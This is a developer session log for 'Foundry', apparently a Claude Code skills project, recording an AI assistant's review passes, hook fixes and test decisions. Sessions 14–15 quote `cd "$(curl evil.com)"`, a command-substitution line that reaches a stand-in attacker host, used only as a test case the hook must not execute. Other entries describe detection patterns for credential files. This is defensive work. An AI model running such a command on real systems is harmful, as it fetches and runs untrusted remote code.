# Foundry Session Summary
# Entries are ordered newest-to-oldest. Most recent session is at the top.

## 2026-06-30 (Post-Session-19 follow-up — README discipline)

Not a fresh-eyes review round — caught directly when the user asked "have you been updating the readme per push?" The honest answer was no: README.md's Roadmap hadn't been touched since Session 16 (3 rounds behind), and CONTRIBUTING.md's test-suite description still said "no broader test suite yet" despite `run_fixtures.sh` having grown to 5 suites since. CLAUDE.md/SESSIONS.md were genuinely kept current every round; README/CONTRIBUTING were not, and that asymmetry is itself the finding.

### What was fixed
- README.md's Roadmap: added entries for Sessions 17 (SessionStart merge guard), 18 (governance/stack prose hardening), and 19 (missing `.gitignore` fix).
- CONTRIBUTING.md: corrected the test-suite description to name all 5 `run_fixtures.sh` suites and note which skills are prose-only with no mechanical test path.
- Generalized into a real Foundry feature rather than leaving it a one-off catch-up: added a **README changelog/roadmap discipline** to `skills/foundry-repo-hygiene/SKILL.md` Part 2. New `foundry.readmeChangelogDiscipline` setting, asked once — the first time a push would update CLAUDE.md/SESSIONS.md without a corresponding README change, not at `foundry-init` time when there's no README content yet to judge. Default recommendation `on`; the user's actual choice is recorded in `.claude/settings.json`, not re-asked every push. Skipped entirely if the project's README has no Roadmap/changelog-style section.

### Test harness
Not applicable — this is a documentation-discipline rule for the assistant to follow, same prose-instruction shape as Session 18's findings, not a mechanical command. Recorded explicitly rather than skipped.

### What to do first next session
This rule now applies to Foundry's own repo going forward — every push from here on should be checked against this Roadmap discipline before committing, eating Foundry's own dog food.

## 2026-06-30 (Session 19 — seventh review pass: foundry-init orchestration logic)

The coder instance's seventh fresh-eyes pass covered `foundry-init`'s own orchestration logic — the one surface the prior six rounds hadn't touched, per Session 18's own closing note about what remained unprobed.

### What was found
1. **Real gap.** A non-secrets project (`HANDLES_SECRETS=false`, a common and entirely legitimate case) never got a `.gitignore` at all. The only writer was `foundry-security`'s `.gitignore`-baseline step, gated on `HANDLES_SECRETS`; `foundry-init` Step 2 skips `foundry-security` outright for that flag. `foundry-repo-hygiene` Part 1 step 6's "first commit should include the scaffolding" then fires with nothing protecting OS/build junk (`.DS_Store`, `__pycache__/`, `node_modules/`, `.venv/`, build artifacts) from entering history permanently — the same class of cost `foundry-security` itself argues is expensive to fix after the fact, just reachable through an unrelated flag.
2. **Cosmetic.** `foundry-repo-hygiene` is invoked twice per `foundry-init` run (Part 1 at Step 2.1, Part 2 at Step 2.7), pointing at the same file with no internal "stop here" marker — the Part 1/Part 2 boundary lived only in `foundry-init`'s prose, not in `foundry-repo-hygiene`'s own text. Resolves correctly in practice on a careful read (the two Parts are unambiguous), so this was flagged as cosmetic, not a real failure mode.
3. **Checked and ruled out.** Suspected `foundry-security` might write into the shared `{{ADDITIONAL_RULES}}` field before `foundry-docs` creates that section (a race-condition concern, since the documented invariant requires every writer to read-then-append into a section that already exists). Confirmed by direct inspection that `foundry-security` only ever writes its own separate, `foundry-docs`-owned "Security Rules" block — never `{{ADDITIONAL_RULES}}`. The two real writers into that field (`foundry-stack`, `foundry-repo-hygiene` Part 2) both run after `foundry-docs` creates the section. The guard is sound; reported as a confirmed-non-issue, same discipline as the Session 13 sibling-directory false alarm.

### What was verified before fixing anything
Read `skills/foundry-repo-hygiene/SKILL.md`, `skills/foundry-security/SKILL.md`, and `skills/foundry-init/SKILL.md` in full and confirmed each claim directly against the actual text: line 20 of `foundry-repo-hygiene` genuinely gated `.gitignore` on "(via `foundry-security`, if the project handles secrets)"; `foundry-init` Step 2 genuinely skips `foundry-security` for `HANDLES_SECRETS=false`; `foundry-security`'s `.gitignore` baseline is genuinely all secrets-pattern content with no generic OS/build-junk patterns; and `foundry-security`'s steps genuinely never reference `{{ADDITIONAL_RULES}}`, only its own separate template block, ruling out finding 3.

### What was fixed
- `foundry-repo-hygiene` Part 1 step 2: now always writes a universal, stack-agnostic OS/build-junk `.gitignore` baseline unconditionally, before the first commit — regardless of `HANDLES_SECRETS`. `foundry-security`'s secrets-pattern baseline is layered on top (merge, not replace) only when the project handles secrets. `foundry-init` Step 2's sequencing note updated to match.
- `foundry-repo-hygiene` Part 1: added a one-line cross-reference at the top stating both invocation points (Step 2.1 / Step 2.7) and that each runs only its own Part — makes the file self-contained rather than relying solely on `foundry-init`'s prose.
- Finding 3: no fix needed, confirmed sound as designed.

### Test harness
Deliberately **not** added for finding 1, and the reasoning is itself the interesting part of this entry: the new OS/build-junk baseline was written as **prose judgment, not a fixed pattern list**, unlike `foundry-security`'s secrets patterns. Considered pinning a fixed, stack-agnostic list (mirroring `foundry-security`'s approach) and giving it a `run_fixtures.sh` case, but concluded that's the wrong model here on reflection — `foundry-security`'s fixed list works because secrets patterns are genuinely stack-agnostic (a `.pem` file is equally dangerous in any language), so a fixed list has no real downside. OS/build junk genuinely varies by stack — a fixed list would put `node_modules/` into a pure-Python project's `.gitignore` as misleading noise, not a neutral default, and the project's own "mechanism over reminder" principle is about *enforcement* (something always happening), not about content needing to be identical regardless of context. The cost of a missed `.pyc` entering history is also not in the same risk class as a missed credential pattern, which is what justifies `foundry-security`'s fixture-suite investment in the first place. No new test case added; this reasoning is recorded here rather than silently skipped, consistent with the standing discipline of always stating the test-harness decision explicitly.

### What to do first next session
Seven rounds now (Sessions 12-14, 16-19) have covered every Foundry skill/hook and the orchestrator's own sequencing. The one remaining known gap is `foundry-repo-hygiene`'s staleness checks (untested by real invocation) — not a fresh-eyes target, just unfinished work, to be confirmed naturally when a real project exercises it.

## 2026-06-30 (Session 18 — sixth review pass: foundry-governance and foundry-stack)

The coder instance's sixth fresh-eyes pass covered the two remaining prose-only skills with no rendered command — `foundry-governance` and `foundry-stack`. With no shell command to fuzz, the review technique shifted: re-reading each skill's stated safeguards against constructed scenarios, looking for a written guarantee with an edge its own trigger condition doesn't cover.

### What was found
All three findings share one underlying shape — a safeguard that treats the *absence* of its trigger condition as equivalent to "the safe case" rather than "unknown, flag it":

1. **`foundry-governance`'s anti-fabrication rule has a gap between "explicit unknown" and "confident-but-unverifiable."** Step 1 sets a real specificity bar (names "the actual letter number and date," per the skill's own CFTC example). Step 2's safeguard — "if the user doesn't know the specifics yet, don't fabricate" — only triggers on something like an explicit "I don't know." A confident but vague answer ("we follow GDPR," no article, no date, no check of whether it actually applies) fails Step 1's bar without ever sounding like Step 2's trigger. This relocates exactly the failure mode the skill exists to prevent — confident-sounding filler nobody double-checks — from the assistant fabricating language to the assistant accepting unverified user language as if it met the bar.

2. **`foundry-stack`'s "verified running" claim has no concrete evidentiary requirement.** Every mechanical hook reviewed in rounds 1-5 ended up with an explicit, re-runnable check (a `jq -e` command, a regex, a fixture file). `foundry-stack`'s parallel claim — "confirm it's actually running... not just that code referencing it was written" — was pure prose with nothing telling the executing instance what evidence to cite, unlike every SESSIONS.md entry in this very project, which religiously cites a test count or a live log line rather than asserting "verified" on its own.

3. **`foundry-stack`'s confidentiality cross-check is conditioned on a precondition it never verifies.** The check only fires if a `REGULATORY CONTEXT`/`COMPLIANCE` section already exists. A genuinely sensitive project where `foundry-governance` was never run — a real, reachable path via `foundry-init`'s Step 0-E retrofit menu, or simply an inaccurately-answered questionnaire — produces zero sections to scan. The skill's text treated "no section found" identically to "confirmed no concern," with nothing surfacing the absence as a gap worth a one-line check.

### What was verified before fixing anything
Read both skill files in full and confirmed each claim directly against the actual text (not a paraphrase): `skills/foundry-governance/SKILL.md` step 2's trigger condition genuinely only names "doesn't know," with no language covering a vague-but-confident answer; `skills/foundry-stack/SKILL.md`'s verification-discipline section genuinely has no instruction to cite specific evidence; the confidentiality check genuinely only fires conditioned on a section already existing. Also confirmed `foundry-init`'s Step 0-E retrofit path is real (lets a user add `foundry-stack` standalone without ever invoking `foundry-governance`), making finding 3 a reachable scenario, not a hypothetical.

### What was fixed
All three were fixed directly in the skill prose (cheap — this is instruction text for an LLM executor, not a script):
- `foundry-governance` step 2: added an explicit paragraph extending the flag-don't-fabricate rule to confident-but-vague answers — if the answer doesn't include something checkable (a specific article/section, a date, or a stated reason the framework applies), treat it as unverified and write the same honest-placeholder text the "I don't know" case already uses.
- `foundry-stack`'s verification-discipline section: added an explicit instruction to cite the concrete evidence inline (test count, live log line, the command used to confirm) rather than asserting "verified" as a bare conclusion.
- `foundry-stack`'s confidentiality check: added an explicit one-line check for when no governance section exists yet — ask once whether the project has any confidentiality/regulatory constraint Foundry doesn't already know about, and point to `foundry-governance` if so, rather than silently treating the absence as a cleared check.

### Test harness
None applicable, and stated explicitly rather than silently skipped: these are LLM-executed judgment instructions in prose skills, not mechanical regex/jq commands — there's no rendered output for `tests/run_fixtures.sh` to exercise. The fix is the sharper instruction text itself, verified by re-reading it for internal consistency with the surrounding steps, not by a runtime test.

### What to do first next session
Six review rounds now (Sessions 12-14, 16-18) have covered every Foundry skill and hook that has one. The only remaining unprobed surface: `foundry-init`'s own orchestration logic (the sequencing and multi-writer coordination across sub-skills, e.g. the `{{ADDITIONAL_RULES}}` read-then-append discipline spanning multiple skills). `foundry-repo-hygiene`'s staleness checks remain a separate, already-known gap (untested by real invocation, not unreviewed) — see KNOWN DEBT.

## 2026-06-30 (Session 17 — fifth review pass: Hook 1 SessionStart doc-loader)

Continuing the now-established pattern, the coder instance pointed its fifth fresh-eyes pass at Hook 1 (the SessionStart doc-loader) — the single most load-bearing piece of Foundry, since it guarantees CLAUDE.md/DECISIONS.md/SESSIONS.md load every session without depending on the assistant remembering.

### What was found
The review fuzzed the actual rendered command (`jq -n --arg` building the JSON payload) with a wide range of adversarial content: literal double-quotes, backtick/`$()` command-substitution syntax, literal `\n`, raw control bytes (`\x01\x02`), invalid UTF-8 sequences, a 500KB file, an empty file, a missing file, and a symlink to an outside file. Every case produced valid JSON with `hookSpecificOutput` correctly present — `jq --arg` handles its own escaping at the encoding level rather than the shell hand-building a JSON string, which is exactly why this hook doesn't have the class of bug the regex-based hooks (2/3/4) had. Filename injection via `{{DOC_FILES_QUOTED}}` was also ruled out as a real attack surface, since the candidate list is always the fixed literal set (CLAUDE.md/DECISIONS.md/SESSIONS.md/STACK.md), never user-controlled input.

One real, reproducible gap was found — in the *merge logic*, not the rendered command. Step 4 of `skills/foundry-hooks/SKILL.md`'s Hook 1 section said only: "If `.claude/settings.json` already exists in the project, read it first and merge... If a SessionStart hook already exists with a similar doc-loading command, ask the user whether to replace or keep both." This is the only place in the whole skill where "merge" is pure prose with no concrete check specified — every other validation step gives an explicit `jq -e` command to run. The review constructed the case where `hooks.SessionStart` already exists but as a bare object (an older/alternate shape, or something a user hand-wrote) rather than an array:
```json
{"hooks": {"SessionStart": {"command": "echo old-style-single-hook"}}}
```
The natural merge an executing agent would reach for, `jq '.hooks.SessionStart += [newEntry]'`, fails outright: `jq: error: object and array cannot be added`. Nothing in the instructions said to check the existing type first — it assumed the existing shape was already an array. Same class of issue as Session 16's Hook 3 type-checking gap, but here it's not a cosmetic message — it's a hard error that would block the entire hook-install step on a real, plausible existing-project shape.

### What was verified before fixing anything
Reproduced the exact failure directly: `jq '.hooks.SessionStart += [...]'` against the bare-object shape above produced `jq: error (at .claude/settings.json:1): object ({"command":...) and array ([{"hooks":[...) cannot be added`, exit code 5 — confirmed as described, not assumed. Also spot-checked the "rendered command is solid" claim independently (adversarial content in a doc file, missing file) rather than taking it purely on the review's word — both confirmed valid JSON output in every case, consistent with the report.

### What was fixed
Replaced the bare `+=` with a type-checked `jq` merge in `skills/foundry-hooks/SKILL.md` step 4:
```bash
jq 'if (.hooks.SessionStart | type) == "array"
    then .hooks.SessionStart += [{"hooks":[{"type":"command","command":$cmd}]}]
    elif (.hooks.SessionStart | type) == "object"
    then .hooks.SessionStart = [.hooks.SessionStart, {"hooks":[{"type":"command","command":$cmd}]}]
    else .hooks.SessionStart = [{"hooks":[{"type":"command","command":$cmd}]}]
    end' --arg cmd "$RENDERED_COMMAND" .claude/settings.json
```
This preserves an existing bare-object hook (wraps it into the array alongside the new entry, rather than discarding it) instead of just avoiding the crash. Cross-referenced from Hook 3's own merge step (same `.hooks.SessionStart` target, same fix, no need to duplicate the explanation) since Hook 3 install can hit the identical existing-shape problem.

Verified against all four plausible starting shapes for `.claude/settings.json`: existing array (appends correctly), bare-object `SessionStart` (the reported failure — now wraps both entries into an array, no data loss), no `hooks` key at all, and a `hooks` object with other events but no `SessionStart` key — all four produced valid, schema-correct output. Malformed JSON was also checked and confirmed to still fail (correctly — no merge strategy can repair already-invalid JSON; this isn't a regression, every other Foundry validation step relies on the same fail-loud behavior).

### Test harness
Added a fifth inline suite to `tests/run_fixtures.sh` for the merge guard — 5 cases. Unlike Hooks 3/4, this is pure `jq` logic with no shell-quoting or JSON-escaping involved, so no command-extraction-from-template step was needed; the guard expression is tested directly against each input shape.

### What to do first next session
Five review rounds now (Sessions 12-14, 16-17) have each found real gaps by probing something with no prior adversarial-review history. The remaining unprobed surface: `foundry-governance` and `foundry-stack`. Pick one for the next pass.

## 2026-06-30 (Session 16 — fourth review pass: Hook 3 status/offer hook)

Following Session 15's invitation to point the next fresh-eyes pass at something not yet probed, the coder instance reviewed Hook 3 (status/offer) and reported 5 findings, explicitly labeled by severity (real bug vs. lower-severity/no-action), with the assessment that none were security holes (unlike the secrets-guard gaps) — worst case is a confusing status message.

### What was found
1. **Real, user-visible bug**: `scaffolded: true` with a missing or empty `scaffoldedDate` rendered the literal broken message `"Foundry: Active (scaffolded )"` — trailing space, empty parens content. A real reachable state (future bug or hand-edit), not synthetic.
2. Empty `.claude/settings.json` produces an empty-string `SCAFFOLDED`/`DISMISSED` rather than the intended literal `"false"` — currently happens to compare false correctly, but is the wrong value, a latent footgun if comparison logic elsewhere changes.
3. No type distinction between a JSON string `"true"` and boolean `true` for `scaffolded`/`dismissed` — `jq -r` stringifies both identically before reaching bash's `[ = "true" ]`.
4. A self-contradictory state (`scaffolded: true` AND `dismissed: true` simultaneously) is silently resolved by checking `scaffolded` first, with nothing flagging the inconsistency.
5. No detection of a missing `jq` binary — every extraction silently degrades to the "not set up" message with no indication the real cause is a missing dependency. `jq` was not documented anywhere as a prerequisite.

Malformed JSON, top-level array, and empty-object cases were also checked and confirmed to degrade safely to the "not set up" message — the fail-safe direction already works correctly.

### What was verified before fixing anything
Independently reproduced all five claims against the real, JSON-embedded command extracted from `templates/settings.status.json.template` (not a simplified version) before touching anything:
- Empty file → `SCAFFOLDED=[]` (empty string, not `"false"`) — confirmed.
- `scaffolded:true`, no date → literal output `"Foundry: Active (scaffolded )"` — confirmed, reproduced exactly as described.
- String `"true"` vs. boolean `true` → both produce identical `SCAFFOLDED=[true]` — confirmed no distinction.
- Both flags `true` simultaneously → confirmed silently resolved by precedence, no flag raised.
- `jq` removed from `PATH` (via a scoped fake-`PATH` directory containing only other needed tools, not a full `PATH` wipe, since that broke `bash` itself on the first attempt) → confirmed silent degradation to the "not set up" offer message.
- Confirmed `jq` is genuinely undocumented anywhere in README.md or USER_GUIDE.md.

### What was fixed
- Replaced the `|| echo false` fallback (which only fired on an actual `jq` process failure) with an explicit `[ -z "$VAR" ] && VAR=default` guard applied uniformly to `SCAFFOLDED`, `DISMISSED`, and `DATE` — this closes both #1 and #2 from the same root cause (any empty-string extraction, whatever the cause, now reliably resolves to a real default rather than an ambiguous empty string). `DATE` defaults to the literal string `"an unknown date"` instead of empty, eliminating the broken trailing-space message.
- Re-verified the fix against 9 cases run through the real, applied, JSON-embedded command (not a scratch draft): empty file, missing date, empty-string date, normal date, dismissed, neither, malformed JSON, top-level array, and the string-`"true"` case — all produce the correct message and valid JSON output.

### What was judged out of scope, not silently dropped
- #3 (string-vs-boolean leniency): adding a true type check would mean a second `jq` call and another failure branch to guard against what's fundamentally a hand-edit-typo scenario — judged not worth the complexity, and arguably reasonable behavior anyway (a user hand-editing `"true"` almost certainly means the same thing as `true`).
- #4 (contradictory state): accepted as a reasonable tiebreak, since `foundry-init` and the dismiss flow — the only writers of these fields — don't produce this combination under normal operation.
- #5 (missing-`jq` detection): not patched locally in this one hook, since `jq` is an undocumented hard dependency for *every* Foundry hook (1 through 4), not just Hook 3 — fixing detection in one hook wouldn't close the real gap. Instead added a Prerequisites note to README.md's Install section and a Roadmap entry recording this as now-done documentation work.

All three reasoned-through, not-fixed items are written into `skills/foundry-hooks/SKILL.md`'s Hook 3 section with their reasoning, not left as unexplained gaps.

### Test harness
Same approach as Session 15's Hook 4 harness: Hook 3 doesn't fit `tests/fixtures/*.txt`'s shape (it branches on JSON-field string equality, not a static filename match), so 9 cases were added inline to `tests/run_fixtures.sh`, run against the real applied template via `jq` extraction. Required a path-handling fix during development: the script's existing `cd "$(dirname "$0")"` meant a naive `$OLDPWD` reference resolved to `tests/`, not the repo root — fixed by capturing an explicit `REPO_ROOT` variable right after the initial `cd`, then verified the whole suite still passes when invoked from an arbitrary external directory (`cd /tmp && bash .../run_fixtures.sh`), not just from inside the repo.

### What to do first next session
- Four review rounds now (Sessions 12-14, 16) have each found real, previously-unverified gaps by probing something with no prior adversarial-review history. The remaining unprobed surface: Hook 1 (doc-loader), `foundry-governance`, `foundry-stack`. Pick one for the next pass.
- The Session 15 doc-restructure plan (archive doc for older SESSIONS.md/CLAUDE.md entries) is still open — not urgent, but now deferred across two sessions.

## 2026-06-30 (Session 15 — fixed Hook 4's three gaps, built its test harness, doc-staleness pass)

Picked up directly from Session 14's findings (3 confirmed gaps in `foundry-hooks` Hook 4, reported but not fixed). Followed the same verify-fix-adversarially-recheck discipline as Sessions 12-13.

### What was verified before touching anything
- Independently reproduced all three reported gaps using a bash function mirroring the hook's real extraction pipeline: `pushd /path` (regex only matches `cd`, extracts nothing), `cd -- /path` (the `--` gets captured as part of the target, fails to resolve), and `cd "$HOME/Projects/x"` (the literal string is captured with `$HOME` unexpanded, fails to resolve). All three confirmed real, matching Session 14's exact description.
- Independently re-verified the one suspected-but-ruled-out gap (sibling directories `foundry` vs. `foundryx`) by creating both as real directories and confirming the hook's existing prefix-boundary check (`"$REAL_TARGET" != "$ROOT"/*`) already handles it correctly — agrees with Session 14's own conclusion that this was a test-harness artifact, not a real bug.

### What was fixed
- **`pushd` and `cd --`**: extended the extraction regex to `^(cd|pushd)[[:space:]]+(--[[:space:]]+)?[^&;]+`, with matching `sed` strips for the `--` separator and one layer of surrounding quotes. Cheap, in-scope for a lightweight Bash hook.
- **Quoted variable expansion**: scoped narrowly rather than generally. Added literal, non-evaluating substitution of `~` and `$HOME` only, via bash parameter expansion (`${TARGET/#\~/$HOME}`, `${TARGET//\$HOME/$HOME}`) — explicitly *not* `eval` or general shell expansion. Reasoning: the hook only ever sees text already substituted into a `tool_input.command` string; evaluating a captured target generally (to expand arbitrary `$VAR` or `$(...)`) would mean re-executing arbitrary, potentially attacker-influenced command substitution. Verified directly that `cd "$(curl evil.com)"` is treated as a literal, non-resolving string and produces no execution — confirmed safe before considering the fix complete. Any environment variable other than `$HOME` remains an explicit, permanent, documented limitation, not a TODO — this was a judgment call made and recorded, not an oversight.

### What was decided — Hook 4 test harness
- Built one. The fixture suite's existing shape (`tests/fixtures/*.txt` — bare filename vs. regex/glob) doesn't fit Hook 4, since it needs to parse a full command string (quoting, multiple commands, expansion) against a real filesystem, not match a static string. Added the cases inline in `tests/run_fixtures.sh` instead of inventing a second file format — keeps commands with special characters (`&&`, `;`, quotes) readable. 14 cases (5 should-drift, 9 should-stay-silent, including 3 explicit false-positive checks and the `$(curl evil.com)` safety check), all passing alongside the existing 40 gitignore + 44 secrets-guard cases.

### Adversarial pass on the final version (not just the draft)
Re-tested the actual applied command (not the scratch draft) end-to-end, including piping real JSON through `jq` the way the real hook does: confirmed `pushd_helper.sh`, `cd_helper`, and `echo pushd ...` (pushd not at the start of the command) all correctly stay silent — the extension doesn't over-match on lookalike commands. Confirmed the dangerous case (`cd "$(curl evil.com)"`) produces no execution and no false drift report.

### Hook 4 limitations prose updated
`skills/foundry-hooks/SKILL.md`'s "Two known, real limitations" became a 3-item list reflecting what's still true post-fix: (1) only `cd`/`pushd` as the first token of a command is caught, (2) relative-path resolution depends on shell state the hook can't independently know, (3) only `~`/`$HOME` are expanded — any other variable or command substitution is an explicit, permanent, deliberate scope boundary (security reasoning given inline, not just stated as a fact).

### Separate task — CLAUDE.md/SESSIONS.md staleness review
Read both files in full (not just the diffs from Session 14). Findings:
- **CLAUDE.md was stale in one concrete way**: "How to run / Bash commands" still said "No test suite yet," despite `tests/run_fixtures.sh` having existed since Session 12. Fixed.
- **Current Status (CLAUDE.md) and this file have both grown into a long, narrative, newest-at-top running log** — 14 entries each as of Session 14, some (Sessions 4, 6, 11) spanning many paragraphs. This makes "what's the actual current state" something a reader has to reconstruct by reading top-to-bottom rather than seeing at a glance. Discussed with the user; decided to defer the actual restructure to a dedicated session, but the user proposed (and this is now the agreed plan, not just a vague "trim it" note) a concrete shape: split into an **archive doc** (e.g. `SESSIONS_ARCHIVE.md`) holding older entries in full, with this file (or CLAUDE.md's Current Status) keeping only the most recent N sessions plus a one-line pointer to the archive for anything older. This preserves full detail (which this exact staleness review just relied on to reconstruct what happened and why) without it all living in the one file/section a reader hits first. Not done yet — pick this up as its own session, not folded into ordinary feature work, since it touches the shape of every future session's doc-update habit and deserves its own sign-off on the cutover point (how many recent sessions stay inline vs. move to archive on day one).
- No drift found between CLAUDE.md's Architecture section and the actual repo structure — every listed file/skill still exists as described.

### What to do first next session
- Decide whether to act on the CLAUDE.md Current Status trim recommendation above (move to a short current-state summary + pointer to SESSIONS.md, stop accumulating one bullet per session there) — explicitly deferred for sign-off, not because it's low-value.
- Continue the pattern: next fresh-eyes review should probe something that hasn't had one yet (Hook 1, Hook 3, `foundry-governance`, or `foundry-stack` are all candidates with no adversarial-review history yet), per the updated CLAUDE.md Next Session Priorities.

## 2026-06-30 (Session 14 — third review pass: Hook 4 directory-drift logger)

After Session 13 shipped, the coder instance suggested pointing the same probing technique at other "verified" claims with no committed test — specifically `foundry-hooks` Hook 4 (the directory-drift logger), which documents two known limitations (mid-chain `cd`, relative `cd ..`) but has no fixture suite of its own (it's a `PreToolUse`/Bash hook reading `jq`-extracted command text, not a regex-against-filenames check, so it doesn't fit the existing `tests/run_fixtures.sh` shape).

### What was found
Probed the actual Hook 4 command (`skills/foundry-hooks/SKILL.md` lines 73-83) against cases beyond the documented 6 test cases and the 2 documented limitations. Three new, real, silent false-negative gaps — drift happens, nothing gets logged, no error either:
1. **`pushd` is invisible.** Same user intent as `cd ~/other-project`, but the command regex only matches a literal leading `cd`. Not in the documented limitations at all.
2. **`cd -- /path`** (the POSIX "end of options" separator). The `--` gets captured as part of the target string by the existing `grep -oE`, so the subsequent `cd "$TARGET"` fails to resolve, and the hook silently does nothing — even though real drift occurred.
3. **Quoted variable expansion** (`cd "$HOME/Projects/other"`). `grep` captures the literal quoted string including the unexpanded `$HOME`, which then fails to resolve as a real path. This is a common, not edge-case, pattern — people quote paths defensively.

All three share one root cause: the hook only handles a literal bareword path immediately after `cd `, not anything requiring shell evaluation (variable expansion, alternate navigation commands, option separators).

One initially-suspected gap (a sibling directory with a similar name, e.g. `foundry` vs. `foundryx`) was probed and ruled out as a real bug — confirmed via direct re-test with both directories actually existing on disk; the original test artifact was caused by a nonexistent directory in the scratch harness, not a flaw in the hook's prefix-boundary logic (`$REAL_TARGET" != "$ROOT"/*` already handles the `foundryx`-vs-`foundry` case correctly).

### What was decided
- Did not fix these yet — reporting only, per the user's request, so the coder instance can address Hook 4 together with anything else surfaced this round and do its own before-shipping verification pass (the pattern Session 13 used: reproduce first, fix, then check the fix doesn't introduce a new false positive/negative, then expand whatever the right committed-test mechanism is for this hook).
- Hook 4's limitations section should be corrected to list these three new gaps explicitly, not just the original two — the current SKILL.md text ("Two known, real limitations") is no longer accurate once these are confirmed.

### What to do first next session
- Decide whether Hook 4 needs its own fixture-style re-runnable test (it doesn't fit `tests/run_fixtures.sh`'s filename-matching shape, since it's a full bash command parser, not a regex against a static list — may need a different harness, e.g. an array of synthetic `tool_input.command` strings piped through the actual extracted hook command).
- After fixing, update the "Two known, real limitations" language in `skills/foundry-hooks/SKILL.md` Hook 4 to reflect whatever remains true post-fix (some of these three may be fixed outright; others, like arbitrary shell evaluation, may be judged permanently out of scope and simply added to the documented limitations list instead — both are legitimate outcomes, the point is the doc should match reality either way).

## 2026-06-29 (Session 13 — second review pass finds 6 more real gaps)

After Session 12 shipped, the Karbot Rage instance was told what changed and explicitly invited to look again. Rather than re-checking the existing fixture file, it deliberately probed realistic filenames not yet covered by either fixture set — a better technique, since a fixture suite by construction can never catch a case nobody thought to write down.

### What was found
Six real, previously-undetected gaps in both the secrets-guard regex (`foundry-hooks/SKILL.md` Hook 2) and the `.gitignore` baseline (`foundry-security/SKILL.md` step 1):
1. **JSON config files** — `config.json`/`config/db.json` slipped through; both patterns only covered YAML.
2. **`service-account.json`-style GCP credential filenames** — no "secret"/"credential" substring at all, arguably the single most common real-world credential leak vector, completely invisible to the old pattern.
3. **Bare-name SSH private keys** (`id_rsa`, `id_ed25519`, etc.) — the `.pem`/`.key` patterns required an extension these conventionally-named files don't have.
4. **Terraform `.tfstate`/`.tfvars`** — both routinely contain plaintext secrets, well-known leak vector, not covered at all.
5. **`.npmrc`** — frequently holds an npm auth token.
6. **`.pfx`** cert bundles.

### What was verified before trusting it
- Independently reproduced every claimed gap myself before touching anything (per the standing verify-before-trust rule) — all six confirmed real against the live patterns, not just the reviewer's assertion.
- While drafting the fix, caught two false-positive risks in my own first draft before they shipped: `id_rsa.pub` (the public key, safe to commit) wrongly blocked, and a realistic `service_account` filename variant (`my-service_account-key.json`) wrongly allowed. Both fixed and re-verified.
- Extended both the secrets-guard regex and the `.gitignore` baseline (the same `config/**/*.json`-style directory gap from Session 12 applied to `.gitignore`'s glob syntax too, for the same underlying reason — a `config*` prefix glob doesn't match files *inside* a `config/` directory).
- Fixture suite grew from 25 `.gitignore` + 23 secrets-guard cases to 40 + 44. All pass.

### What was decided
- The pattern-list approach to secrets detection is structurally, permanently incomplete — it enumerates known-bad name *patterns*, so by nature it will always miss whatever leak vector nobody has thought to add yet. This was already documented as an explicit "what this skill does NOT do" limitation, but Session 13 makes the point concrete: a real second pass with no special insight beyond "try filenames not already in the list" found 6 more real gaps in a five-minute exercise. The actual fix for this class of problem is a real content/pattern scanner (gitleaks/trufflehog), not an ever-growing filename list — noted explicitly in both SKILL.md files.
- Periodically probing with new realistic filenames is a higher-value habit going forward than just re-running the existing fixture suite, since the suite only catches regressions in cases already on file.

### What to do first next session
- Use Foundry on more real projects.
- Consider another fresh-eyes probing pass at some point — there's no reason to believe these six gaps are the last ones; this is a domain where "what did we miss" never fully closes out.

## 2026-06-29 (Session 12 — open-source readiness pass)

Triggered by an unprompted external review from the Karbot Rage instance (Foundry's first real "customer"), which gave both praise and a ranked punch list of credibility gaps. Acted on the three findings ranked "blocking," skipped the "nice-to-have" ones as lower value for a single-maintainer repo right now.

### What was built
1. **Secrets-guard limitation surfaced in README.md**, not just buried in `skills/foundry-security/SKILL.md`. The "What it does" section now states plainly that the hook/`.gitignore` baseline is filename-based only and does not scan source-code contents for hardcoded secrets, with a link to gitleaks/trufflehog and to USER_GUIDE.md's full limitations list.
2. **Committed, re-runnable adversarial fixture suite**: `tests/run_fixtures.sh` + `tests/fixtures/gitignore-cases.txt` + `tests/fixtures/secrets-guard-cases.txt`. Previously, "verified against a 21/25-file adversarial fixture" was a one-time manual claim in prose with nothing to re-run. Wired into `.github/workflows/fixtures.yml` so it runs on every push/PR.
3. **CONTRIBUTING.md** — dev setup, fixture-suite usage, and PR expectations for external contributors. Linked from README.

### What was decided
- Did not act on the "nice-to-have" items from the review (broader CI beyond the fixture suite, de-duplicating shared regex-validation prose between `foundry-hooks`/`foundry-security`, extracting `{{DOC_FILES_QUOTED}}`-style template substitution into a reference script). Judged as real but lower-value-per-effort for a single-maintainer skills repo right now — left as ideas, not tracked as KNOWN DEBT.

### Verification
- Building the fixture suite immediately found a real, previously-undetected regex gap: the secrets-guard pattern's `config[^/]*\.ya?ml` alternative matched `config.yaml` and `src/config.yaml` but missed `config/prod.yaml` (a file inside a `config/` directory, not a file with a `config`-prefixed name). This had been claimed as "verified against a 21-file adversarial fixture" in `skills/foundry-hooks/SKILL.md` prose — the fixture had apparently never actually included this exact case.
- Fixed by adding a second alternative (`(^|/)config/.*\.ya?ml(\.[^/]*)?$`) to the pattern in `skills/foundry-hooks/SKILL.md` Hook 2 and to `tests/run_fixtures.sh`'s copy of the same pattern. Added `config/prod.yaml` and `config/sub/deep.yaml` to `tests/fixtures/secrets-guard-cases.txt`. Re-ran the full suite — all cases pass (`.gitignore` baseline: 25 cases; secrets-guard: 23 cases).
- This is direct, concrete evidence for the review's own underlying claim — that prose-only "tested" claims without committed tests are a real credibility risk, not a hypothetical one.

### What to do first next session
- Use Foundry on more real projects — still the main remaining test.
- If the secrets-guard or `.gitignore` patterns are ever extended again, add fixture cases first and run `tests/run_fixtures.sh` before trusting the change — this is now a standing CLAUDE.md rule.

## 2026-06-29 (Session 11 continued — UX gaps from real first-use on Karbot Rage)

Four gaps surfaced and closed after watching Foundry's first real use on an existing mature project (Karbot Rage).

### What was built
1. **"All of the above" warning** — added to both USER_GUIDE.md decision guide and Step 0-E in foundry-init. The option sounds like the safe/complete choice on an existing project but is actually highest-risk. Warning states this explicitly in both places.
2. **Step 5 — mid-session catch-up offer** — new step in foundry-init, existing-project path only. After init completes mid-session, offers to backfill docs from earlier in the conversation. Leads with a mandatory warning about multi-instance conflicts (another open instance may have already updated the docs more recently). Four scope options: full session / back X prompts / most recent only / skip (recommended when in doubt). Never auto-writes — always drafts for user confirmation first.
